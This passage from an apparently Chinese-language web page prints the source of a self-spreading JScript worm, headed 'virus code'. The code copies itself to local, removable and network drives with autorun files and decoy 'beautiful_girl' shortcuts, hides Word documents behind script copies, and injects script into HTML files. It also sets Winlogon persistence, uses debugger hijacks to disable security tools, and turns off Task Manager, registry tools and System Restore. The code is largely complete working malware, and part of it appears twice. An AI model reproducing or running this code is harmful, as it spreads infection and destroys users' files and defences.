shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp.exe\\Debugger&#39;, &#39;cmd.exe /c del /q /f&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#26144;&#20687;&#21163;&#25345;reg.exe&#65292;&#19981;&#22238;&#26174;&#20449;&#24687;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\reg.exe\\Debugger&#39;, &#39;cmd.exe /c rem&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#26144;&#20687;&#21163;&#25345;RegAlyzer.exe&#65292;&#21551;&#21160;&#21363;&#21024;&#38500;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\RegAlyzer.exe\\Debugger&#39;, &#39;cmd.exe /c del /q /f&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#26144;&#20687;&#21163;&#25345;taskkill.exe,&#19981;&#22238;&#26174;&#20449;&#24687;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskkill.exe\\Debugger&#39;, &#39;cmd.exe /c rem&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#21019;&#24314;&#33258;&#21551;&#21160;&#39033;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit&#39;, SystemPath + &#39;\\userinit.exe,wscript.exe //e:jscript &#39; + SysPath + &#39; /e&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#38544;&#34255;&#25991;&#20214;&#21518;&#32512;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\HideFileExt\\UncheckedValue&#39;, &#39;1&#39;, &#39;REG_DWORD&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#24378;&#21046;&#38544;&#34255;&#25991;&#20214;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\SuperHidden\\UncheckedValue&#39;, &#39;0&#39;, &#39;REG_DWORD&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#31105;&#29992;&#31995;&#32479;&#36824;&#21407;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableConfig&#39;, &#39;1&#39;, &#39;REG_DWORD&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#31105;&#29992;&#31995;&#32479;&#36824;&#21407;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableSR&#39;, &#39;1&#39;, &#39;REG_DWORD&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;&#125;&#10;&#10;function Main() &#123;&#10;    var args = WScript.Arguments;&#10;    if (GetExtensionName(ScriptPath) != &#39;jse&#39; &#38;&#38; args.length &#62; 0) &#123;&#10;        switch (args.Item(0)) &#123;&#10;            case &#39;/e&#39;:&#10;                Install();&#10;                break;&#10;            case &#39;/r&#39;: // &#38544;&#34255;&#21644;&#20266;&#35013;&#33258;&#36523;&#10;                HideAndDisguise();&#10;                break;&#10;            case &#39;/s&#39;: // &#24863;&#26579;&#39537;&#21160;&#22120;&#10;                InfectDrives();&#10;                break;&#10;            case &#39;/n&#39;: // &#24863;&#26579;&#32593;&#32476;&#39537;&#21160;&#22120;&#10;                InfectNetworkDrives();&#10;                break;&#10;            case &#39;/t&#39;: // &#33258;&#26816;&#21518;&#21024;&#38500;&#24403;&#21069;&#33050;&#26412;&#10;                TestAndRepair();&#10;                shell.Run(&#39;cmd /c del /q /f &#39; + ScriptPath, 0);&#10;                break;&#10;            case &#39;/a&#39;: // &#33258;&#26816;&#21518;&#20197;explorer&#38745;&#40664;&#25191;&#34892;&#24403;&#21069;&#33050;&#26412;&#10;                TestAndRepair();&#10;                shell.Run(&#39;explorer.exe /e,/select,&#39; + ScriptPath);&#10;                break;&#10;            default:&#10;                TestAndRepair();&#10;                try &#123;&#10;                    // &#25773;&#25918;&#20010;&#28418;&#20142;&#22993;&#23064;.avi&#65292;&#33804;&#33804;&#21714;&#10;                    shell.Run(&#39;wmplayer.exe &#34;&#39; + ScriptPath.substr(0, ScriptPath.length - 9) + &#39;beautiful_girl_part_&#39; + args.Named.Item(&#39;q&#39;) + &#39;.avi&#39;);&#10;                &#125; catch (e) &#123;&#125;&#10;        &#125;&#10;    &#125; else &#123;&#10;        TestAndRepair();&#10;        TryOpenTheOriginalFile();&#10;    &#125;&#10;&#125;&#10;&#10;Main();</span><br></pre></td></tr></table></figure></span>
+<h2 id="病毒代码">病毒代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var fso = new ActiveXObject(&#39;Scripting.FileSystemObject&#39;);&#10;var Shell = new ActiveXObject(&#39;WScript.Shell&#39;);&#10;var ScriptPath = WScript.ScriptFullName;&#10;var Script = ReadText(ScriptPath);&#10;var SystemPath = fso.GetSpecialFolder(1);&#10;var SysPath = SystemPath + &#39;\\drivers\\annie.sys&#39;;&#10;&#10;function InfectDrives() &#123;&#10;    while (ScriptPath == SysPath) &#123;&#10;        // &#26522;&#20030;&#39537;&#21160;&#22120;&#38598;&#21512;&#10;        var e = new Enumerator(fso.Drives);&#10;        for (e.moveFirst(); !e.atEnd(); e.moveNext()) &#123;&#10;            var drv = e.item();&#10;            // DriveType:UnknownType&#65309;0&#65307;Removable&#65309;1&#65307;Fixed=2&#65307;Remote=3&#65307;CDRom=4.&#10;            // &#22914;&#26524;&#26159;&#30828;&#30424;&#25110;&#32773;&#31227;&#21160;&#23384;&#20648;&#20171;&#36136;&#24182;&#19988;&#39537;&#21160;&#22120;&#21495;&#19981;&#20026;&#39;A:&#39;&#24182;&#19988;&#39537;&#21160;&#22120;&#21487;&#20197;&#35775;&#38382;&#10;            if (((drv.DriveType == 1 || drv.DriveType == 2) &#38;&#38; drv.Path != &#39;A:&#39;) &#38;&#38; drv.IsReady) &#123;&#10;                // &#25335;&#36125;&#33050;&#26412;&#25991;&#20214;&#21040;&#39537;&#21160;&#22120;&#26681;&#30446;&#24405;&#65292;&#21629;&#21517;&#20026;annie.ani&#12290;&#10;                CopyScriptFile(drv.Path + &#39;\\annie.ani&#39;);&#10;                // &#21019;&#24314;AutoRun&#25991;&#20214;&#65292;&#23558;annie.ani&#35774;&#32622;&#20026;&#33258;&#21160;&#36816;&#34892;&#12290;&#10;                CreateAutoRunFile(drv.Path + &#39;\\autorun.inf&#39;);&#10;                CreateShortcut(drv.Path + &#39;\\&#39;);&#10;                InfectFolder(drv.Path + &#39;\\&#39;);&#10;                InfectSubFolder(drv.Path + &#39;\\&#39;);&#10;            &#125;&#10;        &#125;&#10;    &#125;&#10;&#125;&#10;&#10;function GetExtensionName(filename) &#123;&#10;    return fso.GetExtensionName(filename).toLowerCase();&#10;&#125;&#10;&#10;function TryOpenTheOriginalFile() &#123;&#10;    var path = ScriptPath.substr(0, ScriptPath.length - 4);&#10;    if (fso.FileExists(path + &#39;.docx&#39;)) &#123;&#10;        OpenTheOriginalFile(path, &#39;.docx&#39;);&#10;    &#125; else if (fso.FileExists(path + &#39;.doc&#39;)) &#123;&#10;        OpenTheOriginalFile(path, &#39;.doc&#39;);&#10;    &#125; else if (fso.FileExists(path + &#39;.rtf&#39;)) &#123;&#10;        OpenTheOriginalFile(path, &#39;.rtf&#39;);&#10;    &#125;&#10;&#125;&#10;&#10;function Install() &#123;&#10;    shell.run(&#39;cscript.exe //e:jscript &#39; + SysPath + &#39; /r&#39;, 0);&#10;    WScript.Sleep(100);&#10;    shell.run(&#39;cscript.exe //e:jscript &#39; + SysPath + &#39; /s&#39;, 0);&#10;    WScript.Sleep(100);&#10;    shell.Run(&#39;cscript.exe //e:jscript &#39; + SysPath + &#39; /n&#39;, 0);&#10;&#125;&#10;&#10;function GetFileSize(filename) &#123;&#10;    if (fso.FileExists(filename)) &#123;&#10;        return fso.GetFile(filename).Size;&#10;    &#125; else &#123;&#10;        return null;&#10;    &#125;&#10;&#125;&#10;&#10;function GetBaseName(filepath) &#123;&#10;    return fso.GetBaseName(filepath);&#10;&#125;&#10;&#10;function GetDocType(filepath) &#123;&#10;// &#33719;&#21462;html&#25991;&#20214;&#31532;&#19968;&#34892;&#25991;&#20214;&#31867;&#22411;&#35828;&#26126;&#10;    try &#123;&#10;        return fso.OpenTextFile(filepath, 1).ReadLine();&#10;    &#125; catch (e) &#123;&#10;        return null;&#10;    &#125;&#10;&#125;&#10;&#10;function TestAndRepair() &#123;&#10;    if (GetFileSize(SysPath) != 9201) &#123;&#10;        CopyScriptFile(SysPath);&#10;        shell.Run(&#39;wscript.exe //e:jscript &#39; + SysPath + &#39; /e&#39;);&#10;    &#125;&#10;&#125;&#10;&#10;function CreateAutoRunFile(filename) &#123;&#10;    var str = &#39;[autorun]\nshellexecute=wscript.exe //e:jscript annie.ani /a\nshell\\open\\command=wscript.exe //e:jscript annie.ani /a\nshell\\explore\\command=wscript.exe //e:jscript annie.ani /a&#39;;&#10;    if (ReadText(filename) != str) &#123;&#10;        SetFileNewAttributes(filename, 0);&#10;        try &#123;&#10;            var f = fso.CreateTextFile(filename, true);&#10;            f.Write(str);&#10;            f.Close();&#10;        &#125; catch (e) &#123;&#10;            if (fso.FolderExists(filename)) &#123;&#10;                DeleteFolder(filename);&#10;                CreateAutoRunFile(filename);&#10;            &#125;&#10;        &#125; finally &#123;&#10;            SetFileNewAttributes(filename, 39);&#10;        &#125;&#10;    &#125;&#10;&#125;&#10;&#10;function ReadText(filename) &#123;&#10;    try &#123;&#10;        return fso.OpenTextFile(filename, 1).ReadAll();&#10;    &#125; catch (e) &#123;&#10;        return &#39;&#39;;&#10;    &#125;&#10;&#125;&#10;&#10;&#10;function SetFileNewAttributes(filename, newattributes) &#123;&#10;// newattributes &#21487;&#29992;&#20540;&#10;// &#24120;&#25968;          &#20540;     &#25551;&#36848;&#10;// Normal        0      &#26222;&#36890;&#25991;&#20214;&#12290;&#27809;&#26377;&#35774;&#32622;&#20219;&#20309;&#23646;&#24615;&#12290;&#10;// ReadOnly      1      &#21482;&#35835;&#25991;&#20214;&#12290;&#21487;&#35835;&#20889;&#12290;&#10;// Hidden        2      &#38544;&#34255;&#25991;&#20214;&#12290;&#21487;&#35835;&#20889;&#12290;&#10;// System        4      &#31995;&#32479;&#25991;&#20214;&#12290;&#21487;&#35835;&#20889;&#12290;&#10;// Directory     16     &#25991;&#20214;&#22841;&#25110;&#30446;&#24405;&#12290;&#21482;&#35835;&#12290;&#10;// Archive       32     &#19978;&#27425;&#22791;&#20221;&#21518;&#24050;&#26356;&#25913;&#30340;&#25991;&#20214;&#12290;&#21487;&#35835;&#20889;&#12290;&#10;// Alias         1024   &#38142;&#25509;&#25110;&#24555;&#25463;&#26041;&#24335;&#12290;&#21482;&#35835;&#12290;&#10;// Compressed    2048   &#21387;&#32553;&#25991;&#20214;&#12290;&#21482;&#35835;&#12290;&#10;    if (fso.FileExists(filename)) &#123;&#10;        try &#123;&#10;            var f = fso.GetFile(filename);&#10;            f.Attributes = newattributes ;&#10;        &#125; catch (e) &#123;&#125;&#10;    &#125;&#10;&#125;&#10;&#10;function ChangeJseRge(item) &#123;&#10;// &#20462;&#25913;.JSE&#25991;&#20214;&#30340;&#40664;&#35748;&#20540;&#12289;&#40664;&#35748;&#22270;&#26631;&#31561;&#27880;&#20876;&#34920;&#20449;&#24687;&#10;    shell.RegWrite(&#39;HKCR\\&#39; + RegReadItem(&#39;.JSE&#39;) + &#39;\\&#39;, RegReadItem(RegReadItem(item) + &#39;\\&#39;));&#10;    shell.RegWrite(&#39;HKCR\\&#39; + RegReadItem(&#39;.JSE&#39;) + &#39;\\DefaultIcon\\&#39;, RegReadItem(RegReadItem(item) + &#39;\\DefaultIcon\\&#39;));&#10;    shell.RegWrite(&#39;HKCR\\&#39; + RegReadItem(&#39;.JSE&#39;) + &#39;\\FriendlyTypeName&#39;, RegReadItem(RegReadItem(item) + &#39;\\&#39;), &#39;REG_EXPAND_SZ&#39;);&#10;&#125;&#10;&#10;function OpenTheOriginalFile(path, file_type) &#123;&#10;    try &#123;&#10;        var open_command = RegReadItem(RegReadItem(file_type) + &#39;\\shell\\Open\\command&#39;);&#10;        if (open_command.match(/%1/) != null) &#123;&#10;            shell.Run(open_command.replace(&#39;%1&#39;, path + file_type));&#10;        &#125; else &#123;&#10;            shell.Run(open_command + &#39; &#34;&#39; + path + file_type + &#39;&#34;&#39;);&#10;        &#125;&#10;    &#125; catch (e) &#123;&#125;&#10;&#125;&#10;&#10;function HideAndDisguise() &#123;&#10;    while (ScriptPath == SysPath) &#123;&#10;        CopyScriptFile(SysPath);&#10;        InfectCDBuring();&#10;        InfectReg();&#10;        DisguiseJse();&#10;        WScript.Sleep(1000);&#10;    &#125;&#10;&#125;&#10;&#10;function DisguiseJse() &#123;&#10;// &#20462;&#25913;.jse&#25991;&#20214;&#30340;&#27880;&#20876;&#34920;&#20449;&#24687;&#36827;&#34892;&#20266;&#35013;&#10;    try &#123;&#10;        ChangeJseReg(&#39;.docx&#39;);&#10;    &#125; catch (e) &#123;&#10;        try &#123;&#10;            ChangeJseReg(&#39;.doc&#39;);&#10;        &#125; catch (e) &#123;&#10;            try &#123;&#10;                ChangeJseReg(&#39;.rtf&#39;);&#10;            &#125; catch (e) &#123;&#125;&#10;        &#125;&#10;    &#125;&#10;&#125;&#10;&#10;function InfectSubFolder(path) &#123;&#10;    // &#26522;&#20030;&#23376;&#30446;&#24405;&#10;    var e = new Enumerator(fso.GetFolder(path).SubFolders);&#10;    for (e.moveFirst(); !e.atEnd(); e.moveNext()) &#123;&#10;        var folder = e.item();&#10;        // GetSpecialFolder(0) &#36820;&#22238;WindowsFolder&#36335;&#24452;&#10;        if ((folder.Name != &#39;RECYCLER&#39; &#38;&#38; folder.Name != &#39;System Volume Information&#39;) &#38;&#38; folder.Path != fso.GetSpecialFolder(0)) &#123;&#10;            InfectFolder(folder.Path);&#10;            InfectSubFolder(folder.Path);&#10;        &#125;&#10;    &#125;&#10;&#125;&#10;&#10;function CreateShortcut(path) &#123;&#10;    for (var i = 1; i &#60;= 5; i++) &#123;&#10;        var lnkname = path + &#39;beautiful_girl_part_&#39; + i + &#39;.lnk&#39;;&#10;        if (!fso.FileExists(lnkname)) &#123;&#10;            try &#123;&#10;                var shortcut = shell.CreateShortcut(lnkname);&#10;                shortcut.IconLocation = &#39;wmploc.dll,8&#39;;&#10;                shortcut.TargetPath = &#39;wscript.exe&#39;;&#10;                shortcut.Arguments = &#39;//e:jscript annie.ani &#39; + &#39;/q:&#39; + i;&#10;                shortcut.Save();&#10;            &#125; catch (e) &#123;&#125;&#10;        &#125;&#10;    &#125;&#10;&#125;&#10;&#10;function EditHTML(filepath) &#123;&#10;    var str = &#39;&#60;!--[ANNIE83E333BF08546819]--&#62;&#39;;&#10;    if (GetDocType(filepath) != str) &#123;&#10;        var text = ReadText(filepath);&#10;        // &#25152;&#26377;&#26012;&#32447;&#26367;&#25442;&#25104;&#21452;&#26012;&#32447;&#10;        var ki4io = script.replace(/\\/g, &#39;\\\\&#39;);&#10;        // &#25152;&#26377;&#21333;&#24341;&#21495;&#26367;&#25442;&#20026;&#24102;&#36716;&#20041;&#23383;&#31526;&#30340;&#21333;&#24341;&#21495;&#10;        var v0l9m = ki4io.replace(/\&#39;/g, &#39;\\\&#39;&#39;);&#10;        // &#23558;&#33050;&#26412;&#25554;&#20837;html&#20195;&#30721;&#20013;&#10;        var html = &#39;&#60;html&#62;\n&#60;script type=&#34;text/javascript&#34;&#62;\n&#60;!--\nvar ayfp6=new ActiveXObject(\&#39;Scripting.FileSystemObject\&#39;);var dk5h8=new ActiveXObject(\&#39;WScript.Shell\&#39;);var s41k8=ayfp6.GetSpecialFolder(2);var bgw3u=ayfp6.GetTempName();var vlx8c=\&#39;&#39; + v0l9m + &#39;\&#39;+String.fromCharCode(0);var rwyg5=ayfp6.CreateTextFile(s41k8+\&#39;\\\\\&#39;+bgw3u,true);rwyg5.Write(vlx8c);rwyg5.Close();dk5h8.Run(\&#39;wscript.exe //e:jscript \&#39;+s41k8+\&#39;\\\\\&#39;+bgw3u+\&#39; /t\&#39;);\n//--&#62;\n&#60;/script&#62;\n&#60;/html&#62;&#39;;&#10;        SetFileNewAttributes(filepath, 0);&#10;        try &#123;&#10;            // &#23558;&#29983;&#25104;&#30340;DocType&#26631;&#24535;&#21450;HTML&#20195;&#30721;&#21152;&#20837;&#21040;&#21407;&#25991;&#20214;&#20013;&#10;            var file = fso.OpenTextFile(filepath, 2);&#10;            file.WriteLine(str);&#10;            file.WriteLine(text);&#10;            file.WriteLine(html);&#10;            file.Close();&#10;        &#125; catch (e) &#123;&#125;&#10;    &#125;&#10;&#125;&#10;&#10;function InfectFolder(path) &#123;&#10;    // &#26522;&#20030;&#36335;&#24452;&#19979;&#25991;&#20214;&#10;    var e = new Enumerator(fso.GetFolder(path).Files);&#10;    for (e.moveFirst(); !e.atEnd(); e.moveNext()) &#123;&#10;        var filepath = e.item().Path;&#10;        // &#22914;&#26524;&#25193;&#23637;&#21517;&#20026;&#39;doc&#39;&#12289;&#39;docx&#39;&#12289;&#39;ref&#39;&#24182;&#19988;&#25991;&#20214;&#27809;&#26377;&#25171;&#24320;&#10;        if ((GetExtensionName(filepath) == &#39;doc&#39; || GetExtensionName(filepath) == &#39;docx&#39; || GetExtensionName(filepath) == &#39;rtf&#39;) &#38;&#38; GetBaseName(filepath).substr(0, 2) != &#39;~$&#39;) &#123;&#10;            // &#25335;&#36125;&#33050;&#26412;&#25991;&#20214;&#36335;&#24452;&#19979;&#65292;&#25991;&#20214;&#21517;&#20026;&#24050;&#23384;&#22312;office&#25991;&#20214;&#21517;&#65292;&#25193;&#23637;&#21517;&#20026;&#39;.jse&#39;&#10;            CopyScriptFile(path + &#39;\\&#39; + GetBaseName(filepath) + &#39;.jse&#39;);&#10;            // &#38544;&#34255;&#21407;&#25991;&#20214;&#10;            SetFileNewAttributes(filepath, 38);&#10;        &#125; else if (GetExtensionName(filepath) == &#39;htm&#39; || GetExtensionName(filepath) == &#39;html&#39;) &#123; // &#22914;&#26524;&#25193;&#23637;&#21517;&#20026;&#39;htm&#39; &#25110; &#39;html&#39;&#10;            // &#32534;&#36753;HTML&#25991;&#20214;&#65292;&#23558;&#33050;&#26412;&#20195;&#30721;&#25554;&#20837;&#36827;&#21435;&#10;            EditHTML(filepath);&#10;        &#125;&#10;        WScript.Sleep(4);&#10;    &#125;&#10;&#125;&#10;&#10;function RegReadItem(item) &#123;&#10;    return shell.RegRead(&#39;HKCR\\&#39; + item + &#39;\\&#39;);&#10;&#125;&#10;&#10;function InfectNetworkDrives() &#123;&#10;    while (ScriptPath == SysPath) &#123;&#10;        try &#123;&#10;            var network = new ActiveXObject(&#39;WScript.Network&#39;);&#10;            var e = network.EnumNetworkDrives();&#10;            for (var i = 1; i &#60; e.length; i += 2) &#123;&#10;                CopyScriptFile(e.Item(i) + &#39;\\annie.ani&#39;);&#10;                CreateShortcut(e.Item(i) + &#39;\\&#39;);&#10;                InfectFolder(e.Item(i) + &#39;\\&#39;);&#10;            &#125;&#10;        &#125; catch (e) &#123;&#125;&#10;        WScript.Sleep(900000);&#10;    &#125;&#10;&#125;&#10;&#10;function CopyScriptFile(filename) &#123;&#10;    // &#22914;&#26524;&#25991;&#20214;&#22823;&#23567;&#19981;&#20026;9201&#10;    if (GetFileSize(filename) != 9201) &#123;&#10;        // &#35774;&#32622;&#25991;&#20214;&#23646;&#24615;&#20026;Normal&#10;        SetFileNewAttributes(filename, 0);&#10;        try &#123;&#10;            // &#23581;&#35797;&#37325;&#20889;&#25991;&#20214;&#10;            var f = fso.CreateTextFile(filename, true);&#10;            f.Write(script);&#10;            f.Close();&#10;        &#125; catch (e) &#123;   // &#22914;&#26524;&#37325;&#20889;&#22833;&#36133;&#10;            // &#22914;&#26524;&#25991;&#20214;&#36335;&#24452;&#20026;&#25991;&#20214;&#22841;&#10;            if (fso.FolderExists(filename)) &#123;&#10;                // &#21024;&#38500;&#25991;&#20214;&#22841;&#10;                DeleteFolder(filename);&#10;                // &#37325;&#26032;&#25335;&#36125;&#33050;&#26412;&#25991;&#20214;&#10;                CopyScriptFile(filename);&#10;            &#125;&#10;        &#125; finally &#123;&#10;            // &#22914;&#26524;&#25991;&#20214;&#25193;&#23637;&#21517;&#19981;&#20026;&#39;jse&#39;&#10;            if (GetExtensionName(filename) != &#39;jse&#39;) &#123;&#10;                // &#35774;&#32622;&#25991;&#20214;&#23646;&#24615;&#20026; &#39;ReadOnly | Hidden | System | Archive&#39;&#10;                SetFileNewAttributes(filename, 39);&#10;            &#125;&#10;        &#125;&#10;    &#125;&#10;&#125;&#10;&#10;function InfectCDBuring() &#123;&#10;    try &#123;&#10;        var e9hgn = shell.RegRead(&#39;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\CD Burning&#39;);&#10;        CopyScriptFile(e9hgn + &#39;\\annie.ani&#39;);&#10;        CreateAutoRunFile(e9hgn + &#39;\\autorun.inf&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;&#125;&#10;&#10;function DeleteFolder(filename) &#123;&#10;    try &#123;&#10;        fso.DeleteFolder(filename, true);&#10;    &#125; catch (e) &#123;&#10;        shell.Run(&#39;cmd.exe /c rd /s /q \\\\.\\&#34;&#39; + filename + &#39;&#34;&#39;, 0, true);&#10;    &#125;&#10;&#125;&#10;&#10;function InfectReg() &#123;&#10;    try &#123;&#10;        // &#21024;&#38500;&#21491;&#38190;&#25171;&#24320;&#26041;&#24335;&#10;        shell.RegDelete(&#39;HKCR\\*\\shellex\\ContextMenuHandlers\\Open With\\&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#20462;&#25913;&#39;.inf&#39;&#25991;&#20214;&#23433;&#35013;&#26041;&#24335;&#65292;&#23433;&#35013;&#37197;&#32622;&#25991;&#20214;&#26102;&#21024;&#38500;&#37197;&#32622;&#25991;&#20214;&#10;        shell.RegWrite(&#39;HKCR\\&#39; + RegReadItem(&#39;.inf&#39;) + &#39;\\shell\\Install\\command\\&#39;, &#39;cmd.exe /c del /q /f &#34;%1&#34;&#39;, &#39;REG_EXPAND_SZ&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#20462;&#25913;&#39;.jse&#39;&#25991;&#20214;&#30340;&#25171;&#24320;&#26041;&#24335;&#10;        shell.RegWrite(&#39;HKCR\\&#39; + RegReadItem(&#39;.JSE&#39;) + &#39;\\Shell\\Edit\\Command\\&#39;, RegReadItem(RegReadItem(&#39;.JSE&#39;) + &#39;\\Shell\\Open\\Command\\&#39;), &#39;REG_EXPAND_SZ&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        shell.RegDelete(&#39;HKCR\\&#39; + RegReadItem(&#39;.JSE&#39;) + &#39;\\Shell\\Open2\\&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        shell.RegDelete(&#39;HKCR\\&#39; + RegReadItem(&#39;.JSE&#39;) + &#39;\\Shell\\Open2\\Command\\&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        shell.RegDelete(&#39;HKCR\\&#39; + RegReadItem(&#39;.JSE&#39;) + &#39;\\ShellEx\\PropertySheetHandlers\\WSHProps\\&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#20462;&#25913;&#39;.reg&#39;&#25991;&#20214;&#30340;&#25171;&#24320;&#26041;&#24335;&#65292;&#25171;&#24320;&#21363;&#21024;&#38500;&#10;        shell.RegWrite(&#39;HKCR\\&#39; + RegReadItem(&#39;.reg&#39;) + &#39;\\shell\\open\\command\\&#39;, &#39;cmd.exe /c del /q /f &#34;%1&#34;&#39;, &#39;REG_EXPAND_SZ&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#31105;&#27490;&#29992;&#25143;&#20462;&#25913;&#25991;&#20214;&#23646;&#24615;&#10;        shell.RegWrite(&#39;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoFileAssociate&#39;, &#39;1&#39;, &#39;REG_DWORD&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#31105;&#29992;&#27880;&#20876;&#34920;&#32534;&#36753;&#22120;&#10;        shell.RegWrite(&#39;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools&#39;, &#39;1&#39;, &#39;REG_DWORD&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#31105;&#29992;&#20219;&#21153;&#31649;&#29702;&#22120;&#10;        shell.RegWrite(&#39;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr&#39;, &#39;1&#39;, &#39;REG_DWORD&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#31105;&#29992;&#32452;&#31574;&#30053;&#31649;&#29702;&#22120;&#10;        shell.RegWrite(&#39;HKCU\\Software\\Policies\\Microsoft\\MMC\\RestrictToPermittedSnapins&#39;, &#39;1&#39;, &#39;REG_DWORD&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#26144;&#20687;&#21163;&#25345;attrib.exe&#65292;&#19981;&#22238;&#26174;&#20449;&#24687;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\attrib.exe\\Debugger&#39;, &#39;cmd.exe /c rem&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#26144;&#20687;&#21163;&#25345;autoruns.exe&#65292;&#21551;&#21160;&#21363;&#21024;&#38500;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns.exe\\Debugger&#39;, &#39;cmd.exe /c del /q /f&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#26144;&#20687;&#21163;&#25345;procexp.exe&#65292;&#21551;&#21160;&#21363;&#21024;&#38500;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp.exe\\Debugger&#39;, &#39;cmd.exe /c del /q /f&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#26144;&#20687;&#21163;&#25345;reg.exe&#65292;&#19981;&#22238;&#26174;&#20449;&#24687;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\reg.exe\\Debugger&#39;, &#39;cmd.exe /c rem&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#26144;&#20687;&#21163;&#25345;RegAlyzer.exe&#65292;&#21551;&#21160;&#21363;&#21024;&#38500;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\RegAlyzer.exe\\Debugger&#39;, &#39;cmd.exe /c del /q /f&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#26144;&#20687;&#21163;&#25345;taskkill.exe,&#19981;&#22238;&#26174;&#20449;&#24687;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskkill.exe\\Debugger&#39;, &#39;cmd.exe /c rem&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#21019;&#24314;&#33258;&#21551;&#21160;&#39033;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit&#39;, SystemPath + &#39;\\userinit.exe,wscript.exe //e:jscript &#39; + SysPath + &#39; /e&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#38544;&#34255;&#25991;&#20214;&#21518;&#32512;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\HideFileExt\\UncheckedValue&#39;, &#39;1&#39;, &#39;REG_DWORD&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#24378;&#21046;&#38544;&#34255;&#25991;&#20214;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\SuperHidden\\UncheckedValue&#39;, &#39;0&#39;, &#39;REG_DWORD&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#31105;&#29992;&#31995;&#32479;&#36824;&#21407;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableConfig&#39;, &#39;1&#39;, &#39;REG_DWORD&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // 